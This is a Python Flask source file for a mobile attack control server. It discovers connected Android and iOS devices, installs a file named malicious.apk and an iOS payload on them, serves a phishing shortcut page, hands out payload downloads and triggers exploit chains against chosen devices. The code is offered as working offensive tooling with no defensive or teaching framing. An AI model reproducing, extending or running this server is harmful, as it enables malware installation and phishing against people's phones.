import os
import yaml
import threading
import time
from flask import Flask, send_file, request, jsonify, render_template
from utils.adb_helper import ADBHelper
from utils.ios_helper import IOSHelper
from utils.exploit_chains import chain_deploy
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

app = Flask(__name__, template_folder='templates', static_folder='static')

# Load config
with open('config/config.yaml', 'r') as f:
    CONFIG = yaml.safe_load(f)

adb = ADBHelper()
ios = IOSHelper()

class PayloadWatcher(FileSystemEventHandler):
    def on_modified(self, event):
        print(f"Payload updated: {event.src_path}")
        # Trigger redeploy

observer = Observer()
observer.schedule(PayloadWatcher(), 'payloads/', recursive=True)
observer.start()

def auto_discover():
    """Background device discovery"""
    while True:
        adb.refresh_devices()
        ios.refresh_devices()
        time.sleep(30)

threading.Thread(target=auto_discover, daemon=True).start()

@app.route('/')
def dashboard():
    devices = {
        'android': adb.devices,
        'ios': ios.devices
    }
    installs = adb.get_install_status()
    return render_template('dashboard.html', devices=devices, installs=installs)

@app.route('/devices')
def list_devices():
    return jsonify({
        'android': adb.devices,
        'ios': ios.devices
    })

@app.route('/install/android/<device_id>')
def install_android(device_id):
    apk_path = 'payloads/android/malicious.apk'
    result = adb.install(device_id, apk_path)
    return jsonify(result)

@app.route('/install/ios/<udid>')
def install_ios(udid):
    ipa_path = 'payloads/ios/payload.ipa'
    result = ios.install(udid, ipa_path)
    return jsonify(result)

@app.route('/shortcut')
def phishing_shortcut():
    return send_file('static/shortcut.html')

@app.route('/payloads/<path:filename>')
def serve_payload(filename):
    return send_file(f'payloads/{filename}', as_attachment=True)

@app.route('/exploit/<target>/<device_id>')
def trigger_exploit(target, device_id):
    result = chain_deploy(target, device_id)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)